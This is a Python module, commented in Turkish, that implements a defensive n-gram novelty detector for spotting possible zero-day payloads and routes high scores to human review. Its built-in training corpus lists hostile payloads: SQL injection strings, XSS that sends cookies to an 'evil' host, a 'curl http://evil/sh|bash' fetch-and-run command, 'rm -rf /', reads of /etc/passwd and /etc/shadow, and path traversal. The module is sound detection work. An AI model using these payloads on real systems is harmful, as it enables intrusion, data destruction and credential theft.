"""
Faz 42 - Sifir-Gun Sezgisi / Yenilik (Novelty) Tespiti.

--- Ko-evrim fikri ---
Imza tabanli tespit (Faz 1, 14) yalnizca BILDIGIMIZ kotuyu yakalar. Ama
saldirgan tamamen YENI bir teknik (sifir-gun) getirdiginde, hicbir imza
eslesmez ve sistem sessiz kalir. Bu modul tersini yapar: bir payload'un
onceden gordugumuz saldiri ornekleriyle NE KADAR BENZEMEDIGINI olcer. Yuksek
yenilik = "bunu daha once hic gormedik" = potansiyel sifir-gun -> insana
yukselt (auto-block DEGIL).

--- Nasil ---
Payload'i karakter n-gram'larina (varsayilan 3) boler. Egitilmis profil,
bilinen saldiri (ve istege bagli benign) ornek korpusundaki n-gram sayimlarini
tutar. Bir payload'un yeniligi = profilde HIC GORULMEMIS ya da COK NADIR olan
n-gram'larinin oranidir. Bu, bilgi-kuramsal "surpriz" (dusuk olasilik = yuksek
sasirtici) fikrinin basit, sayim tabanli halidir.

--- Esik (belgeli) ---
  * Bir n-gram "nadir" sayilir: profilde hic yoksa (gorulmemis), YA DA
    sayimi rare_count esigi kadar dusukse (varsayilan 1 - yani sadece
    gorulmemisler; istege gore artirilabilir).
  * novelty = nadir n-gram sayisi / toplam n-gram sayisi (0..1).
  * is_novel = novelty >= 0.6 (payload'un cogunlugu tanidik degil).
  * rare_ngram_ratio = novelty ile ayni tabana oturur (seffaflik icin ayri
    raporlanir).

--- DURUSTLUK NOTU ---
Ne yapar: bir girdinin egitim korpusuna gore NE KADAR TANIDIK OLMADIGINI
sayimla olcer. Ne IDDIA ETMEZ: yuksek yenilik "kesin kotu" DEMEK DEGILDIR -
sadece "tanimadik" demektir. Yeni ama tamamen mesru bir istek de (yeni bir API
alani, farkli bir dil/kodlama, nadir bir kullanici girdisi) yuksek yenilik
uretebilir. Bu yuzden cikti bir HUMAN-REVIEW yonlendirmesidir; asla otomatik
blok gerekcesi degildir. Kucuk/deterministik bir modeldir; egitimli bir
anomali/ML dedektorunun tam kopyasi degildir.

--- Gercek cerceve eslemesi ---
Novelty/anomali tespiti (one-class / outlier), n-gram nadirlik analizi,
bilgi-kuramsal surpriz (dusuk olasilik = yuksek bilgi), imzasiz sifir-gun
sezgisi. Kavramsal olarak PAYL/ byte-n-gram malware siniflandiricilariyla ayni
ailedendir ama burada "bilinmeyeni isaretleme" yonunde kullanilir.

--- ETIK/HUKUKI CERCEVE (degismez) ---
Tamamen SAVUNMADIR. Yalnizca bize sunulan payload metnini yerel olarak
analiz eder; hicbir baska sisteme dokunmaz, hack-back yoktur, disari veri
gondermez. Karar daima insana yukseltmedir, otomatik eylem degil.

Harici bagimlilik yok - sadece stdlib collections.
"""
from collections import Counter
from dataclasses import dataclass, field


def char_ngrams(text: str, n: int = 3) -> list:
    """Bir metnin karakter n-gram'larini (kayan pencere) uretir.

    `text`: girdi metni. `n`: pencere boyutu (varsayilan 3).
    Donus: n-gram string'lerinin listesi (sira korunur). Metin n'den
    kisaysa, tum metin tek bir n-gram olarak dondurulur (bilgi kaybolmasin).
    """
    if not text:
        return []
    if len(text) <= n:
        return [text]
    return [text[i:i + n] for i in range(len(text) - n + 1)]


class NoveltyModel:
    """N-gram nadirlik tabanli yenilik (novelty) modeli.

    `train` ile bilinen payload korpusundan bir n-gram frekans profili
    kurar; `novelty` ile bir payload'un bu profile gore ne kadar "tanidik
    olmadigini" 0..1 arasinda skorlar. Deterministik: rastgelelik yoktur.
    """

    def __init__(self, n=3):
        self.n = n
        self._profile = Counter()      # n-gram -> egitimdeki toplam sayim
        self._trained_docs = 0

    def train(self, known_payloads: list) -> "NoveltyModel":
        """Bilinen payload listesinden n-gram frekans profili kurar.

        Cagrildikca birikimlidir (ust uste egitilebilir). Kendini dondurur
        ki zincirlenebilsin: `NoveltyModel().train(corpus)`.
        """
        for payload in known_payloads:
            for gram in char_ngrams(payload or "", self.n):
                self._profile[gram] += 1
            self._trained_docs += 1
        return self

    def _is_rare(self, gram: str, rare_count: int) -> bool:
        """Bir n-gram profilde gorulmemis ya da esigin altinda mi."""
        return self._profile.get(gram, 0) < rare_count

    def novelty(self, payload: str, rare_count: int = 1) -> dict:
        """Bir payload'un yenilik skorunu hesaplar.

        `rare_count`: bir n-gram'in "nadir" sayilmasi icin profil sayiminin
        altinda kalmasi gereken esik. Varsayilan 1 -> sadece HIC gorulmemis
        n-gram'lar nadir sayilir.

        Donus dict:
          novelty          : float 0..1, 1 = tamamen gorulmemis
          rare_ngram_ratio : float 0..1, nadir n-gram orani
          verdict          : str, Turkce degerlendirme
          is_novel         : bool, novelty >= 0.6
        """
        grams = char_ngrams(payload or "", self.n)
        if not grams:
            return {
                "novelty": 0.0,
                "rare_ngram_ratio": 0.0,
                "verdict": "Bos payload - degerlendirilecek n-gram yok",
                "is_novel": False,
            }

        # Egitilmemis model: her sey yenidir ama bu anlamsizdir -> durustce belirt.
        if not self._profile:
            return {
                "novelty": 1.0,
                "rare_ngram_ratio": 1.0,
                "verdict": (
                    "Model egitilmemis: her girdi 'yeni' gorunur - bu skor "
                    "anlamli degil, once train() cagirin"
                ),
                "is_novel": True,
            }

        rare = sum(1 for g in grams if self._is_rare(g, rare_count))
        ratio = rare / len(grams)
        is_novel = ratio >= 0.6

        if is_novel:
            verdict = (
                f"YUKSEK YENILIK (%{ratio * 100:.0f}): payload'un cogu n-gram'i "
                f"bilinen korpusta yok - potansiyel sifir-gun/tanidik olmayan "
                f"desen. INSAN INCELEMESINE yukselt (otomatik blok DEGIL)."
            )
        elif ratio >= 0.3:
            verdict = (
                f"KISMI YENILIK (%{ratio * 100:.0f}): bazi desenler tanidik, "
                f"bazilari degil - izlemeye deger, muhtemelen varyant"
            )
        else:
            verdict = (
                f"DUSUK YENILIK (%{ratio * 100:.0f}): payload bilinen saldiri "
                f"desenlerine buyuk olcude benziyor - tanidik profil"
            )

        return {
            "novelty": round(ratio, 3),
            "rare_ngram_ratio": round(ratio, 3),
            "verdict": verdict,
            "is_novel": is_novel,
        }


# Kutu-disi (out-of-the-box) skorlama icin kucuk, temsili saldiri korpusu.
# Yaygin SQLi/XSS/RCE/path-traversal token'lari. Amac: cagiranin egitim
# yapmadan da makul bir taban yenilik skoru alabilmesi.
_DEFAULT_CORPUS = [
    # SQLi
    "' OR '1'='1",
    "' OR 1=1 --",
    "admin' --",
    "UNION SELECT username, password FROM users",
    "1; DROP TABLE users",
    "' UNION SELECT NULL, NULL --",
    "SELECT * FROM information_schema.tables",
    "' AND SLEEP(5) --",
    # XSS
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(document.cookie)",
    "<svg/onload=alert(1)>",
    "\"><script>document.location='http://evil'</script>",
    # RCE / komut enjeksiyonu
    "; cat /etc/passwd",
    "| whoami",
    "$(curl http://evil/sh|bash)",
    "`id`",
    "; rm -rf /",
    "&& ping -c 1 attacker.com",
    # Path traversal / LFI
    "../../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "/etc/shadow",
    "php://filter/convert.base64-encode/resource=index.php",
]


def default_model() -> NoveltyModel:
    """Yerlesik kucuk saldiri korpusuyla onceden egitilmis bir model doner.

    Cagiran, train() cagirmadan hemen `novelty()` kullanabilsin diye. Korpus
    yaygin SQLi/XSS/RCE/path-traversal parcalarindan olusur. DURUSTLUK: yuksek
    yenilik "kesin kotu" DEMEK DEGILDIR; "tanidik degil" demektir -> insana
    yonlendir, asla otomatik blok yapma.
    """
    return NoveltyModel(n=3).train(_DEFAULT_CORPUS)
